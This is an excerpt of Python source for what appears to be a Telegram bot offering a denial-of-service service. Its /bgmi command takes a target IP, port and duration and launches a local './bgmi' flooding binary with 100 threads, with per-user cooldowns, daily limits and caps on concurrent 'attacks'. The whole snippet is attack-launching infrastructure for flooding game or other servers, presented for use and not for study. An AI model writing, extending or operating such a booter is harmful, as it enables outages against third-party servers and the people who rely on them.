...
user_attacks, user_cooldowns = {}, {}
active_attacks = 0
attack_lock = threading.Lock()

thread_count = 100 
COOLDOWN_DURATION, DAILY_LIMIT, MAX_ACTIVE = 30, 50, 3
...
def bgmi(m):
    ...
    uid = m.from_user.id
    if active_attacks >= MAX_ACTIVE:
        bot.reply_to(m, "⏳ Slots full!")
        return
    try:
        args = m.text.split()[1:]
        ip, port, dur = args[0], args[1], int(args[2])
        ...
        def run():
            global active_attacks
            try:
                subprocess.run(["./bgmi", ip, port, str(dur), str(thread_count)], timeout=dur+10)
            finally:
                with attack_lock: active_attacks -= 1
                bot.send_message(m.chat.id, "✅ Attack Finished")
        threading.Thread(target=run, daemon=True).start()
    except: bot.reply_to(m, "❌ Usage: `/bgmi <IP> <PORT> <TIME>`")
